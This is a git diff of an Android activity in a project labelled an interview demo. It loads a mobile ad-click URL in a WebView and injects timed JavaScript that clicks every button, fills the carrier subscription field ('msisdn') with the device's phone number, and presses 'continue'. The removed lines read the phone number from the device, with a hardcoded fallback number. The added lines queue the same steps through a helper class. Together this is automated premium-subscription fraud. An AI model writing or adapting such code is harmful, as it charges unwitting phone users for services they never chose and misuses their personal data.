@@ -9,11 +9,16 @@ import android.text.TextUtils;
 import android.widget.Button;
 import android.widget.Toast;
 
+import java.util.Arrays;
+import java.util.concurrent.ArrayBlockingQueue;
+import java.util.concurrent.BlockingQueue;
+
 import moziqi.interviewdemo.R;
 import moziqi.interviewdemo.util.LogUtils;
 import moziqi.interviewdemo.util.TouchUtils;
 import moziqi.interviewdemo.webview.SimulationListener;
 import moziqi.interviewdemo.webview.TouchWebView;
+import moziqi.interviewdemo.webview.WebViewHelper;
 
 public class SubscribeActivity extends AppCompatActivity {
 
@@ -24,6 +29,8 @@ public class SubscribeActivity extends AppCompatActivity {
     private TouchWebView mTouchWebView;
 
     private TouchUtils touchUtils = new TouchUtils();
+
+    private WebViewHelper webViewHelper = null;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -38,79 +45,27 @@ public class SubscribeActivity extends AppCompatActivity {
         mGetMsg = findViewById(R.id.getMsg);
         mTouchWebView = findViewById(R.id.touchWebView);
 
-        mTouchWebView.loadURL("http://clickmob.c0c.xyz/rest/ck/o/1245/2387042?");
-//        mTouchWebView.loadURL("http://smobi.fuse-ad.com/tl?a=3&o=59");
-        mTouchWebView.setSimulationListener(new SimulationListener() {
-            @Override
-            public void doSimulation() {
-            }
 
-            @Override
-            public void onPageFinished(String url) {
-                //在这个方法处理
-                if (handler.hasMessages(1)) {
-                    handler.removeMessages(1);
-                }
-                handler.sendEmptyMessageDelayed(1, 3000);
-                //这是二次点击处理
-                if (handler.hasMessages(2)) {
-                    handler.removeMessages(2);
-                }
-                handler.sendEmptyMessageDelayed(2, 15 * 1000);
-            }
+        webViewHelper = new WebViewHelper(mTouchWebView);
 
-            @Override
-            public void onError(String url) {
 
-            }
-        });
+        BlockingQueue<WebViewHelper.WebData> webData = new ArrayBlockingQueue<>(3);
+        //String.format("javascript:document.getElementsByClassName('b_algoheader')[%d].getElementsByTagName('a')[0].click();", webViewHelper.getRandom(5))
+        webData.add(webViewHelper.createWebData(1, "http://clickmob.c0c.xyz/rest/ck/o/1245/2387042?",
+                Arrays.asList(
+                        //先点击首页的按钮
+                        webViewHelper.createJsObj("javascript:for(var i=0;i<document.getElementsByName('button').length;i++){document.getElementsByName('button')[i].click();}"),
+                        //在输入框获取焦点
+                        webViewHelper.createJsObj("javascript:document.getElementById('msisdn').focus();", 2000),
+                        webViewHelper.createJsObj("javascript:document.getElementsByClassName('inputbox')[0].focus();", 2000),
+                        //填充电话号码
+                        webViewHelper.createJsObj("javascript:document.getElementById('msisdn').value='%s';", 5000, WebViewHelper.JsObj.JS_TYPE_PHONE),
+                        webViewHelper.createJsObj("javascript:document.getElementsByClassName('inputbox')[0].value='%s';", 15000, WebViewHelper.JsObj.JS_TYPE_PHONE),
+                        //点击
+                        webViewHelper.createJsObj("javascript:document.getElementsByClassName('continue')[0].click();")
+                )));
+        webViewHelper.setData(webData).start();
     }
-
-
-    private Handler handler = new Handler(Looper.getMainLooper()) {
-        @Override
-        public void handleMessage(Message msg) {
-            super.handleMessage(msg);
-            LogUtils.i("mo", String.format("msg.what>>%d", msg.what));
-            switch (msg.what) {
-                case 1:
-                    mTouchWebView.loadJs("javascript:for(var i=0;i<document.getElementsByName('button').length;i++){document.getElementsByName('button')[i].click();}");
-                    break;
-                case 2:
-                    //这里还有类型Operatore、TIM、Vodafone、Wind
-                    //获取输入框，填充电话号码
-                    //msisdn
-                    String phoneNum = PhoneUtils.getPhoneNum(getApplicationContext());
-                    String result = TextUtils.isEmpty(phoneNum) ? "13580889531" : phoneNum;
-                    mTouchWebView.loadJs("javascript:document.getElementById('msisdn').focus()");
-                    mTouchWebView.loadJs("javascript:document.getElementsByClassName('inputbox')[0].focus()");
-                    mTouchWebView.loadJs(
-                            String.format("javascript:document.getElementById('msisdn').value='%1s';document.getElementsByClassName('inputbox')[0].value='%2s';",
-                                    result, result)
-                    );
-                    handler.sendEmptyMessageDelayed(3, 5000);
-                    break;
-                case 3:
-                    mTouchWebView.loadJs("javascript:document.getElementsByClassName('continue')[0].click()");
-                    handler.sendEmptyMessageDelayed(3, 5000);
-                    break;
-                case 4:
-                    break;
-                case 5:
-                    break;
-                case 6:
-                    break;
-                case 7:
-                    while (mTouchWebView.canGoBack()) {
-                        mTouchWebView.goBack();
-                    }
-                    break;
-                case 8:
-                    mTouchWebView.reload();
-                    break;
-            }
-        }
-    };
 
     @Override
     public void onBackPressed() {
@@ -127,7 +82,16 @@ public class SubscribeActivity extends AppCompatActivity {
         }
     }
 
-//    private Handler handler = new Handler(Looper.getMainLooper()) {
+    @Override
+    protected void onDestroy() {
+        if (webViewHelper != null) {
+            webViewHelper.onDestroy();
+        }
+        super.onDestroy();
+
+    }
+
+    //    private Handler handler = new Handler(Looper.getMainLooper()) {
 //        @Override
 //        public void handleMessage(Message msg) {
 //            super.handleMessage(msg);
